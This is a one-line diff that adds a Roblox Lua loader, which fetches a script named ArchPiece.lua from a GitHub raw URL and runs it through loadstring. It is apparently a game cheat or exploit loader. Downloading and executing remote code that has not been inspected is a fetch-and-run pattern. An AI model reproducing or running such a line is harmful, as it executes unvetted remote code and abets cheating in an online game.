@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/xpa1n/Scripts/main/ArchPiece.lua"))()
